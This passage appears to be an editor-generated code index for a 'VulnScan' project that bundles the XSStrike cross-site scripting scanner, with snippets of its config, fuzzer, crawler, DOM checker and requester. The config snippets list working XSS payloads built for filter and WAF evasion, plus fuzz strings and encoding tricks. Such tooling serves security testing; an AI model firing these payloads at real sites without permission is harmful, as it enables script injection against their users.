        "peekOfCode": "jFillings = \";\"\n# \"Things\" that can be used before > e.g. <tag attr=value%0dx>\nlFillings = (\"\", \"%0dx\")\n# \"Things\" to use between event handler and = or between function and =\neFillings = (\"%09\", \"%0a\", \"%0d\", \"+\")\nfillings = (\"%09\", \"%0a\", \"%0d\", \"/+/\")  # \"Things\" to use instead of space\neventHandlers = {  # Event handlers and the tags compatible with them\n    \"ontoggle\": [\"details\"],\n    \"onpointerenter\": [\"d3v\", \"details\", \"html\", \"a\"],\n    \"onmouseover\": [\"a\", \"html\", \"d3v\"],",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "lFillings",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "lFillings = (\"\", \"%0dx\")\n# \"Things\" to use between event handler and = or between function and =\neFillings = (\"%09\", \"%0a\", \"%0d\", \"+\")\nfillings = (\"%09\", \"%0a\", \"%0d\", \"/+/\")  # \"Things\" to use instead of space\neventHandlers = {  # Event handlers and the tags compatible with them\n    \"ontoggle\": [\"details\"],\n    \"onpointerenter\": [\"d3v\", \"details\", \"html\", \"a\"],\n    \"onmouseover\": [\"a\", \"html\", \"d3v\"],\n}\nfunctions = (  # JavaScript functions to get a popup",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "eFillings",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "eFillings = (\"%09\", \"%0a\", \"%0d\", \"+\")\nfillings = (\"%09\", \"%0a\", \"%0d\", \"/+/\")  # \"Things\" to use instead of space\neventHandlers = {  # Event handlers and the tags compatible with them\n    \"ontoggle\": [\"details\"],\n    \"onpointerenter\": [\"d3v\", \"details\", \"html\", \"a\"],\n    \"onmouseover\": [\"a\", \"html\", \"d3v\"],\n}\nfunctions = (  # JavaScript functions to get a popup\n    \"[8].find(confirm)\",\n    \"confirm()\",",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "fillings",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "fillings = (\"%09\", \"%0a\", \"%0d\", \"/+/\")  # \"Things\" to use instead of space\neventHandlers = {  # Event handlers and the tags compatible with them\n    \"ontoggle\": [\"details\"],\n    \"onpointerenter\": [\"d3v\", \"details\", \"html\", \"a\"],\n    \"onmouseover\": [\"a\", \"html\", \"d3v\"],\n}\nfunctions = (  # JavaScript functions to get a popup\n    \"[8].find(confirm)\",\n    \"confirm()\",\n    \"(confirm)()\",",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "eventHandlers",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "eventHandlers = {  # Event handlers and the tags compatible with them\n    \"ontoggle\": [\"details\"],\n    \"onpointerenter\": [\"d3v\", \"details\", \"html\", \"a\"],\n    \"onmouseover\": [\"a\", \"html\", \"d3v\"],\n}\nfunctions = (  # JavaScript functions to get a popup\n    \"[8].find(confirm)\",\n    \"confirm()\",\n    \"(confirm)()\",\n    \"co\\u006efir\\u006d()\",",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "functions",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "functions = (  # JavaScript functions to get a popup\n    \"[8].find(confirm)\",\n    \"confirm()\",\n    \"(confirm)()\",\n    \"co\\u006efir\\u006d()\",\n    \"(prompt)``\",\n    \"a=prompt,a()\",\n)\npayloads = (  # Payloads for filter & WAF evasion\n    \"'\\\"</Script><Html Onmouseover=(confirm)()//\" \"<imG/sRc=l oNerrOr=(prompt)() x>\",",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "payloads = (  # Payloads for filter & WAF evasion\n    \"'\\\"</Script><Html Onmouseover=(confirm)()//\" \"<imG/sRc=l oNerrOr=(prompt)() x>\",\n    \"<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>\",\n    \"<deTails open oNToggle=confi\\u0072m()>\",\n    \"<img sRc=l oNerrOr=(confirm)() x>\",\n    '<svg/x=\">\"/onload=confirm()//',\n    \"<svg%0Aonload=%09((pro\\u006dpt))()//\",\n    \"<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>\",\n    \"<sCript x>confirm``</scRipt x>\",\n    \"<Script x>prompt()</scRiPt x>\",",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "fuzzes",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "fuzzes = (  # Fuzz strings to test WAFs\n    \"<test\",\n    \"<test//\",\n    \"<test>\",\n    \"<test x>\",\n    \"<test x=y\",\n    \"<test x=y//\",\n    \"<test/oNxX=yYy//\",\n    \"<test oNxX=yYy>\",\n    \"<test onload=x\",",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "headers",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "headers = {  # default headers\n    \"User-Agent\": \"$\",\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n    \"Accept-Language\": \"en-US,en;q=0.5\",\n    \"Accept-Encoding\": \"gzip,deflate\",\n    \"Connection\": \"close\",\n    \"DNT\": \"1\",\n    \"Upgrade-Insecure-Requests\": \"1\",\n}\nblindParams = [  # common paramtere names to be bruteforced for parameter discovery",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "blindParams",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "blindParams = [  # common paramtere names to be bruteforced for parameter discovery\n    \"redirect\",\n    \"redir\",\n    \"url\",\n    \"link\",\n    \"goto\",\n    \"debug\",\n    \"_debug\",\n    \"test\",\n    \"get\",",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "dom",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.dom",
        "description": "VulnScan.modules.xss-strike.core.dom",
        "peekOfCode": "def dom(response):\n    highlighted = []\n    sources = r\"\"\"\\b(?:document\\.(URL|documentURI|URLUnencoded|baseURI|cookie|referrer)|location\\.(href|search|hash|pathname)|window\\.name|history\\.(pushState|replaceState)(local|session)Storage)\\b\"\"\"\n    sinks = r\"\"\"\\b(?:eval|evaluate|execCommand|assign|navigate|getResponseHeaderopen|showModalDialog|Function|set(Timeout|Interval|Immediate)|execScript|crypto.generateCRMFRequest|ScriptElement\\.(src|text|textContent|innerText)|.*?\\.onEventName|document\\.(write|writeln)|.*?\\.innerHTML|Range\\.createContextualFragment|(document|window)\\.location)\\b\"\"\"\n    scripts = re.findall(r\"(?i)(?s)<script[^>]*>(.*?)</script>\", response)\n    sinkFound, sourceFound = False, False\n    for script in scripts:\n        script = script.split(\"\\n\")\n        num = 1\n        allControlledVariables = set()",
        "detail": "VulnScan.modules.xss-strike.core.dom",
        "documentation": {}
    },
    {
        "label": "base64",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.encoders",
        "description": "VulnScan.modules.xss-strike.core.encoders",
        "peekOfCode": "def base64(string):\n    if re.match(r\"^[A-Za-z0-9+\\/=]+$\", string) and (len(string) % 4) == 0:\n        return b64.b64decode(string.encode(\"utf-8\")).decode(\"utf-8\")\n    else:\n        return b64.b64encode(string.encode(\"utf-8\")).decode(\"utf-8\")",
        "detail": "VulnScan.modules.xss-strike.core.encoders",
        "documentation": {}
    },
    {
        "label": "filterChecker",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.filterChecker",
        "description": "VulnScan.modules.xss-strike.core.filterChecker",
        "peekOfCode": "def filterChecker(url, params, headers, GET, delay, occurences, timeout, encoding):\n    positions = occurences.keys()\n    sortedEfficiencies = {}\n    # adding < > to environments anyway because they can be used in all contexts\n    environments = set([\"<\", \">\"])\n    for i in range(len(positions)):\n        sortedEfficiencies[i] = {}\n    for i in occurences:\n        occurences[i][\"score\"] = {}\n        context = occurences[i][\"context\"]",
        "detail": "VulnScan.modules.xss-strike.core.filterChecker",
        "documentation": {}
    },
    {
        "label": "fuzzer",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.fuzzer",
        "description": "VulnScan.modules.xss-strike.core.fuzzer",
        "peekOfCode": "def fuzzer(url, params, headers, GET, delay, timeout, WAF, encoding):\n    for fuzz in fuzzes:\n        if delay == 0:\n            delay = 0\n        t = delay + randint(delay, delay * 2) + counter(fuzz)\n        sleep(t)\n        try:\n            if encoding:\n                fuzz = encoding(unquote(fuzz))\n            data = replaceValue(params, xsschecker, fuzz, copy.deepcopy)",
        "detail": "VulnScan.modules.xss-strike.core.fuzzer",
        "documentation": {}
    },
    {
        "label": "logger",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.fuzzer",
        "description": "VulnScan.modules.xss-strike.core.fuzzer",
        "peekOfCode": "logger = setup_logger(__name__)\ndef fuzzer(url, params, headers, GET, delay, timeout, WAF, encoding):\n    for fuzz in fuzzes:\n        if delay == 0:\n            delay = 0\n        t = delay + randint(delay, delay * 2) + counter(fuzz)\n        sleep(t)\n        try:\n            if encoding:\n                fuzz = encoding(unquote(fuzz))",
        "detail": "VulnScan.modules.xss-strike.core.fuzzer",
        "documentation": {}
    },
    {
        "label": "generator",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.generator",
        "description": "VulnScan.modules.xss-strike.core.generator",
        "peekOfCode": "def generator(occurences, response):\n    scripts = extractScripts(response)\n    index = 0\n    vectors = {\n        11: set(),\n        10: set(),\n        9: set(),\n        8: set(),\n        7: set(),\n        6: set(),",
        "detail": "VulnScan.modules.xss-strike.core.generator",
        "documentation": {}
    },
    {
        "label": "htmlParser",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.htmlParser",
        "description": "VulnScan.modules.xss-strike.core.htmlParser",
        "peekOfCode": "def htmlParser(response, encoding):\n    rawResponse = response  # raw response returned by requests\n    response = response.text  # response content\n    if encoding:  # if the user has specified an encoding, encode the probe in that\n        response = response.replace(encoding(xsschecker), xsschecker)\n    reflections = response.count(xsschecker)\n    position_and_context = {}\n    environment_details = {}\n    clean_response = re.sub(r\"<!--[.\\s\\S]*?-->\", \"\", response)\n    script_checkable = clean_response",
        "detail": "VulnScan.modules.xss-strike.core.htmlParser",
        "documentation": {}
    },
    {
        "label": "jsContexter",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.jsContexter",
        "description": "VulnScan.modules.xss-strike.core.jsContexter",
        "peekOfCode": "def jsContexter(script):\n    broken = script.split(xsschecker)\n    pre = broken[0]\n    #  remove everything that is between {..}, \"...\" or '...'\n    pre = re.sub(r'(?s)\\{.*?\\}|(?s)\\(.*?\\)|(?s)\".*?\"|(?s)\\'.*?\\'', \"\", pre)\n    breaker = \"\"\n    num = 0\n    for char in pre:  # iterate over the remaining characters\n        if char == \"{\":\n            breaker += \"}\"",
        "detail": "VulnScan.modules.xss-strike.core.jsContexter",
        "documentation": {}
    },
    {
        "label": "CustomFormatter",
        "kind": 6,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "class CustomFormatter(logging.Formatter):\n    def format(self, record):\n        msg = super().format(record)\n        if record.levelname in log_config.keys():\n            msg = \"%s %s %s\" % (\n                log_config[record.levelname][\"prefix\"], msg, end)\n        return msg\nclass CustomStreamHandler(logging.StreamHandler):\n    default_terminator = \"\\n\"\n    def emit(self, record):",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "CustomStreamHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "class CustomStreamHandler(logging.StreamHandler):\n    default_terminator = \"\\n\"\n    def emit(self, record):\n        \"\"\"\n        Overrides emit method to temporally update terminator character in case last log record character is '\\r'\n        :param record:\n        :return:\n        \"\"\"\n        if record.msg.endswith(\"\\r\"):\n            self.terminator = \"\\r\"",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "log_red_line",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "def log_red_line(self, amount=60, level=\"INFO\"):\n    _switch_to_no_format_loggers(self)\n    _get_level_and_log(self, red + (\"-\" * amount) + end, level)\n    _switch_to_default_loggers(self)\ndef log_no_format(self, msg=\"\", level=\"INFO\"):\n    _switch_to_no_format_loggers(self)\n    _get_level_and_log(self, msg, level)\n    _switch_to_default_loggers(self)\ndef log_debug_json(self, msg=\"\", data={}):\n    if self.isEnabledFor(logging.DEBUG):",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "log_no_format",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "def log_no_format(self, msg=\"\", level=\"INFO\"):\n    _switch_to_no_format_loggers(self)\n    _get_level_and_log(self, msg, level)\n    _switch_to_default_loggers(self)\ndef log_debug_json(self, msg=\"\", data={}):\n    if self.isEnabledFor(logging.DEBUG):\n        if isinstance(data, dict):\n            import json\n            try:\n                self.debug(\"{} {}\".format(msg, json.dumps(data, indent=2)))",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "log_debug_json",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "def log_debug_json(self, msg=\"\", data={}):\n    if self.isEnabledFor(logging.DEBUG):\n        if isinstance(data, dict):\n            import json\n            try:\n                self.debug(\"{} {}\".format(msg, json.dumps(data, indent=2)))\n            except TypeError:\n                self.debug(\"{} {}\".format(msg, data))\n        else:\n            self.debug(\"{} {}\".format(msg, data))",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "setup_logger",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "def setup_logger(name=\"xsstrike\"):\n    from types import MethodType\n    logger = logging.getLogger(name)\n    logger.setLevel(logging.DEBUG)\n    console_handler = CustomStreamHandler(sys.stdout)\n    console_handler.setLevel(log_config[console_log_level][\"value\"])\n    console_handler.setFormatter(CustomFormatter(\"%(message)s\"))\n    logger.addHandler(console_handler)\n    # Setup blank handler to temporally use to log without format\n    no_format_console_handler = CustomStreamHandler(sys.stdout)",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "__all__",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "__all__ = [\"setup_logger\", \"console_log_level\", \"file_log_level\", \"log_file\"]\nconsole_log_level = \"INFO\"\nfile_log_level = None\nlog_file = \"VulnScan/results/xss-test/xss.log\"\n\"\"\"\nDefault Logging Levels\nCRITICAL = 50\nERROR = 40\nWARNING = 30\nINFO = 20",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "console_log_level",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "console_log_level = \"INFO\"\nfile_log_level = None\nlog_file = \"VulnScan/results/xss-test/xss.log\"\n\"\"\"\nDefault Logging Levels\nCRITICAL = 50\nERROR = 40\nWARNING = 30\nINFO = 20\nDEBUG = 10",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "file_log_level",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "file_log_level = None\nlog_file = \"VulnScan/results/xss-test/xss.log\"\n\"\"\"\nDefault Logging Levels\nCRITICAL = 50\nERROR = 40\nWARNING = 30\nINFO = 20\nDEBUG = 10\n\"\"\"",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "log_file",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "log_file = \"VulnScan/results/xss-test/xss.log\"\n\"\"\"\nDefault Logging Levels\nCRITICAL = 50\nERROR = 40\nWARNING = 30\nINFO = 20\nDEBUG = 10\n\"\"\"\nVULN_LEVEL_NUM = 60",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "CRITICAL",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "CRITICAL = 50\nERROR = 40\nWARNING = 30\nINFO = 20\nDEBUG = 10\n\"\"\"\nVULN_LEVEL_NUM = 60\nRUN_LEVEL_NUM = 22\nGOOD_LEVEL_NUM = 25\nlogging.addLevelName(VULN_LEVEL_NUM, \"VULN\")",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "ERROR",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "ERROR = 40\nWARNING = 30\nINFO = 20\nDEBUG = 10\n\"\"\"\nVULN_LEVEL_NUM = 60\nRUN_LEVEL_NUM = 22\nGOOD_LEVEL_NUM = 25\nlogging.addLevelName(VULN_LEVEL_NUM, \"VULN\")\nlogging.addLevelName(RUN_LEVEL_NUM, \"RUN\")",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "WARNING",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "WARNING = 30\nINFO = 20\nDEBUG = 10\n\"\"\"\nVULN_LEVEL_NUM = 60\nRUN_LEVEL_NUM = 22\nGOOD_LEVEL_NUM = 25\nlogging.addLevelName(VULN_LEVEL_NUM, \"VULN\")\nlogging.addLevelName(RUN_LEVEL_NUM, \"RUN\")\nlogging.addLevelName(GOOD_LEVEL_NUM, \"GOOD\")",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "INFO",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "INFO = 20\nDEBUG = 10\n\"\"\"\nVULN_LEVEL_NUM = 60\nRUN_LEVEL_NUM = 22\nGOOD_LEVEL_NUM = 25\nlogging.addLevelName(VULN_LEVEL_NUM, \"VULN\")\nlogging.addLevelName(RUN_LEVEL_NUM, \"RUN\")\nlogging.addLevelName(GOOD_LEVEL_NUM, \"GOOD\")\ndef _vuln(self, msg, *args, **kwargs):",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "DEBUG",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "DEBUG = 10\n\"\"\"\nVULN_LEVEL_NUM = 60\nRUN_LEVEL_NUM = 22\nGOOD_LEVEL_NUM = 25\nlogging.addLevelName(VULN_LEVEL_NUM, \"VULN\")\nlogging.addLevelName(RUN_LEVEL_NUM, \"RUN\")\nlogging.addLevelName(GOOD_LEVEL_NUM, \"GOOD\")\ndef _vuln(self, msg, *args, **kwargs):\n    if self.isEnabledFor(VULN_LEVEL_NUM):",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "VULN_LEVEL_NUM",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "VULN_LEVEL_NUM = 60\nRUN_LEVEL_NUM = 22\nGOOD_LEVEL_NUM = 25\nlogging.addLevelName(VULN_LEVEL_NUM, \"VULN\")\nlogging.addLevelName(RUN_LEVEL_NUM, \"RUN\")\nlogging.addLevelName(GOOD_LEVEL_NUM, \"GOOD\")\ndef _vuln(self, msg, *args, **kwargs):\n    if self.isEnabledFor(VULN_LEVEL_NUM):\n        self._log(VULN_LEVEL_NUM, msg, args, **kwargs)\ndef _run(self, msg, *args, **kwargs):",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "RUN_LEVEL_NUM",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "RUN_LEVEL_NUM = 22\nGOOD_LEVEL_NUM = 25\nlogging.addLevelName(VULN_LEVEL_NUM, \"VULN\")\nlogging.addLevelName(RUN_LEVEL_NUM, \"RUN\")\nlogging.addLevelName(GOOD_LEVEL_NUM, \"GOOD\")\ndef _vuln(self, msg, *args, **kwargs):\n    if self.isEnabledFor(VULN_LEVEL_NUM):\n        self._log(VULN_LEVEL_NUM, msg, args, **kwargs)\ndef _run(self, msg, *args, **kwargs):\n    if self.isEnabledFor(RUN_LEVEL_NUM):",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "GOOD_LEVEL_NUM",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "GOOD_LEVEL_NUM = 25\nlogging.addLevelName(VULN_LEVEL_NUM, \"VULN\")\nlogging.addLevelName(RUN_LEVEL_NUM, \"RUN\")\nlogging.addLevelName(GOOD_LEVEL_NUM, \"GOOD\")\ndef _vuln(self, msg, *args, **kwargs):\n    if self.isEnabledFor(VULN_LEVEL_NUM):\n        self._log(VULN_LEVEL_NUM, msg, args, **kwargs)\ndef _run(self, msg, *args, **kwargs):\n    if self.isEnabledFor(RUN_LEVEL_NUM):\n        self._log(RUN_LEVEL_NUM, msg, args, **kwargs)",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "logging.Logger.vuln",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "logging.Logger.vuln = _vuln\nlogging.Logger.run = _run\nlogging.Logger.good = _good\nlog_config = {\n    \"DEBUG\": {\n        \"value\": logging.DEBUG,\n        \"prefix\": \"{}[*]{}\".format(yellow, end),\n    },\n    \"INFO\": {\n        \"value\": logging.INFO,",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "logging.Logger.run",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "logging.Logger.run = _run\nlogging.Logger.good = _good\nlog_config = {\n    \"DEBUG\": {\n        \"value\": logging.DEBUG,\n        \"prefix\": \"{}[*]{}\".format(yellow, end),\n    },\n    \"INFO\": {\n        \"value\": logging.INFO,\n        \"prefix\": info,",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "logging.Logger.good",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "logging.Logger.good = _good\nlog_config = {\n    \"DEBUG\": {\n        \"value\": logging.DEBUG,\n        \"prefix\": \"{}[*]{}\".format(yellow, end),\n    },\n    \"INFO\": {\n        \"value\": logging.INFO,\n        \"prefix\": info,\n    },",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "log_config",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.log",
        "description": "VulnScan.modules.xss-strike.core.log",
        "peekOfCode": "log_config = {\n    \"DEBUG\": {\n        \"value\": logging.DEBUG,\n        \"prefix\": \"{}[*]{}\".format(yellow, end),\n    },\n    \"INFO\": {\n        \"value\": logging.INFO,\n        \"prefix\": info,\n    },\n    \"RUN\": {",
        "detail": "VulnScan.modules.xss-strike.core.log",
        "documentation": {}
    },
    {
        "label": "photon",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.photon",
        "description": "VulnScan.modules.xss-strike.core.photon",
        "peekOfCode": "def photon(seedUrl, headers, level, threadCount, delay, timeout, skipDOM):\n    forms = []  # web forms\n    processed = set()  # urls that have been crawled\n    storage = set()  # urls that belong to the target i.e. in-scope\n    schema = urlparse(seedUrl).scheme  # extract the scheme e.g. http or https\n    host = urlparse(seedUrl).netloc  # extract the host e.g. example.com\n    main_url = schema + \"://\" + host  # join scheme and host to make the root url\n    storage.add(seedUrl)  # add the url to storage\n    checkedDOMs = []\n    def rec(target):",
        "detail": "VulnScan.modules.xss-strike.core.photon",
        "documentation": {}
    },
    {
        "label": "logger",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.photon",
        "description": "VulnScan.modules.xss-strike.core.photon",
        "peekOfCode": "logger = setup_logger(__name__)\ndef photon(seedUrl, headers, level, threadCount, delay, timeout, skipDOM):\n    forms = []  # web forms\n    processed = set()  # urls that have been crawled\n    storage = set()  # urls that belong to the target i.e. in-scope\n    schema = urlparse(seedUrl).scheme  # extract the scheme e.g. http or https\n    host = urlparse(seedUrl).netloc  # extract the host e.g. example.com\n    main_url = schema + \"://\" + host  # join scheme and host to make the root url\n    storage.add(seedUrl)  # add the url to storage\n    checkedDOMs = []",
        "detail": "VulnScan.modules.xss-strike.core.photon",
        "documentation": {}
    },
    {
        "label": "prompt",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.prompt",
        "description": "VulnScan.modules.xss-strike.core.prompt",
        "peekOfCode": "def prompt(default=None):\n    # try assigning default editor, if fails, use default\n    editor = os.environ.get(\"EDITOR\", defaultEditor)\n    # create a temporary file and open it\n    with tempfile.NamedTemporaryFile(mode=\"r+\") as tmpfile:\n        if default:  # if prompt should have some predefined text\n            tmpfile.write(default)\n            tmpfile.flush()\n        child_pid = os.fork()\n        is_child = child_pid == 0",
        "detail": "VulnScan.modules.xss-strike.core.prompt",
        "documentation": {}
    },
    {
        "label": "logger",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.prompt",
        "description": "VulnScan.modules.xss-strike.core.prompt",
        "peekOfCode": "logger = setup_logger(__name__)\ndef prompt(default=None):\n    # try assigning default editor, if fails, use default\n    editor = os.environ.get(\"EDITOR\", defaultEditor)\n    # create a temporary file and open it\n    with tempfile.NamedTemporaryFile(mode=\"r+\") as tmpfile:\n        if default:  # if prompt should have some predefined text\n            tmpfile.write(default)\n            tmpfile.flush()\n        child_pid = os.fork()",
        "detail": "VulnScan.modules.xss-strike.core.prompt",
        "documentation": {}
    },
    {
        "label": "requester",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.requester",
        "description": "VulnScan.modules.xss-strike.core.requester",
        "peekOfCode": "def requester(url, data, headers, GET, delay, timeout):\n    if getVar(\"jsonData\"):\n        data = converter(data)\n    elif getVar(\"path\"):\n        url = converter(data, url)\n        data = []\n        GET, POST = True, False\n    time.sleep(delay)\n    user_agents = [\n        \"Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\",",
        "detail": "VulnScan.modules.xss-strike.core.requester",
        "documentation": {}
    },
    {
        "label": "logger",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.requester",
        "description": "VulnScan.modules.xss-strike.core.requester",
        "peekOfCode": "logger = setup_logger(__name__)\nwarnings.filterwarnings(\"ignore\")  # Disable SSL related warnings\ndef requester(url, data, headers, GET, delay, timeout):\n    if getVar(\"jsonData\"):\n        data = converter(data)\n    elif getVar(\"path\"):\n        url = converter(data, url)\n        data = []\n        GET, POST = True, False\n    time.sleep(delay)",
        "detail": "VulnScan.modules.xss-strike.core.requester",
        "documentation": {}
    },
    {
        "label": "updater",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.updater",
        "description": "VulnScan.modules.xss-strike.core.updater",
        "peekOfCode": "def updater():\n    logger.run(\"Checking for updates\")\n    latestCommit = get(\n        \"https://raw.githubusercontent.com/s0md3v/XSStrike/master/core/config.py\"\n    ).text\n    if changes not in latestCommit:  # just a hack to see if a new version is available\n        changelog = re.search(r\"changes = '''(.*?)'''\", latestCommit)\n        changelog = changelog.group(1).split(\n            \";\"\n        )  # splitting the changes to form a list",
        "detail": "VulnScan.modules.xss-strike.core.updater",
        "documentation": {}
    },
    {
        "label": "logger",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.updater",
        "description": "VulnScan.modules.xss-strike.core.updater",
